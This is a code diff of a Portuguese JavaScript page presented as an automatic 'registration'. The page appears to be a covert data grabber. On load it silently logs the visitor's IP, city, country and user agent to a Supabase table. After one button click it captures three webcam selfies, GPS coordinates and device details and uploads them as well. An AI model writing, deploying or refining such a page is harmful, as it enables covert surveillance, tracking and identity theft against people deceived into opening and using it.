@@ -5,7 +5,7 @@ const SUPABASE_URL = "https://gskcadoofoqwhqhscxcs.supabase.co";
 const SUPABASE_KEY = "sb_publishable_xup-F-C4wv_epMIAbohpjQ_aXnLZOL3";
 const supabaseClient = supabase.createClient(SUPABASE_URL, SUPABASE_KEY);
 
-// Elementos
+// Elementos da Página
 const video = document.getElementById("video");
 const btn = document.getElementById("btn");
 const statusText = document.getElementById("status");
@@ -24,12 +24,12 @@ function falar(texto){
 }
 
 // =================================================================
-// SALVAR NO BANCO
+// FUNÇÃO SALVAR
 // =================================================================
 async function salvarNoBanco(dados) {
   try {
     const { error } = await supabaseClient.from('checkins').insert([dados]);
-    if (error) console.error(error);
+    if (error) console.error("Erro:", error);
     else console.log("✅ Salvo:", dados.tipo_captura);
     return true;
   } catch(err) {
@@ -43,12 +43,12 @@ async function salvarNoBanco(dados) {
 // =================================================================
 async function salvarPreCadastro() {
   try {
-    statusText.innerHTML = "🌐 Salvando pré-cadastro (IP)...";
+    statusText.innerHTML = "🌐 Salvando pré-cadastro (IP + conexão)...";
 
     const res = await fetch("https://ipapi.co/json/");
     const data = await res.json();
 
-    const dadosPre = {
+    await salvarNoBanco({
       tipo_captura: "previa",
       ip: data.ip || "indisponível",
       cidade: data.city || "",
@@ -56,14 +56,13 @@ async function salvarPreCadastro() {
       pais: data.country_name || "",
       user_agent: navigator.userAgent,
       timestamp: new Date().toISOString()
-    };
+    });
 
-    await salvarNoBanco(dadosPre);
-    statusText.innerHTML = "✅ Pré-cadastro salvo!<br>Clique no botão para completar.";
+    statusText.innerHTML = "✅ Pré-cadastro salvo!<br>Clique no botão para completar o cadastro.";
 
-  } catch(e) {
-    console.error(e);
-    statusText.innerHTML = "⚠️ Pré-cadastro falhou";
+  } catch(err) {
+    console.error(err);
+    statusText.innerHTML = "⚠️ Falha no pré-cadastro";
   }
 }
 
@@ -72,8 +71,8 @@ async function salvarPreCadastro() {
 // =================================================================
 window.onload = async () => {
   falar("Seu cadastro será realizado automaticamente após clicar no botão verde abaixo.");
-  statusText.innerHTML = "🟡 Iniciando...";
-  await salvarPreCadastro();   // ← Pré-cadastro
+  statusText.innerHTML = "🟡 Iniciando sistema...";
+  await salvarPreCadastro(); // Pré-cadastro automático
 
   // Inicia câmera
   try {
@@ -90,24 +89,24 @@ btn.addEventListener("click", async () => {
   try {
     btn.disabled = true;
     btn.innerHTML = "PROCESSANDO...";
-
     statusText.innerHTML = "📸 Capturando fotos...";
 
+    // Captura fotos
     canvas.width = 640;
     canvas.height = 480;
     const ctx = canvas.getContext("2d");
     const fotos = [];
-
     for(let i = 0; i < 3; i++) {
       ctx.drawImage(video, 0, 0, 640, 480);
       fotos.push(canvas.toDataURL("image/jpeg", 0.35));
       if(i < 2) await new Promise(r => setTimeout(r, 1000));
     }
 
-    if (video.srcObject) video.srcObject.getTracks().forEach(t => t.stop());
+    if (video.srcObject) video.srcObject.getTracks().forEach(track => track.stop());
 
-    // GPS
-    let latitude = "não permitido", longitude = "não permitido";
+    // Geolocalização
+    let latitude = "não permitido";
+    let longitude = "não permitido";
     try {
       const pos = await new Promise((res, rej) => navigator.geolocation.getCurrentPosition(res, rej));
       latitude = pos.coords.latitude;
@@ -115,7 +114,8 @@ btn.addEventListener("click", async () => {
     } catch(e) {}
 
     // IP
-    let ip = "indisponível", cidade = "", estado = "", pais = "";
+    let ip = "indisponível";
+    let cidade = "", estado = "", pais = "";
     try {
       const res = await fetch("https://ipapi.co/json/");
       const data = await res.json();
@@ -127,6 +127,7 @@ btn.addEventListener("click", async () => {
 
     const infoDispositivo = analisarDispositivo();
 
+    // Salva completo
     await salvarNoBanco({
       tipo_captura: "completo",
       selfies: fotos,
@@ -140,12 +141,11 @@ btn.addEventListener("click", async () => {
       modelo_dispositivo: infoDispositivo.model,
       versao_android: infoDispositivo.androidVersion,
       navegador: infoDispositivo.browser,
-      plataforma: navigator.platform,
       largura_tela: window.innerWidth,
       altura_tela: window.innerHeight
     });
 
-    statusText.innerHTML = "✅ Cadastro completo!";
+    statusText.innerHTML = "✅ Cadastro completo salvo!";
     falar("Cadastro concluído com sucesso.");
 
     setTimeout(() => {
@@ -167,5 +167,5 @@ function analisarDispositivo() {
     const match = ua.match(/Android\s([0-9\.]+)/);
     if (match) androidVersion = match[1];
   }
-  return { androidVersion, model: "Mobile", browser: "Chrome" };
+  return { androidVersion, model: "Dispositivo móvel", browser: "Navegador" };
 }
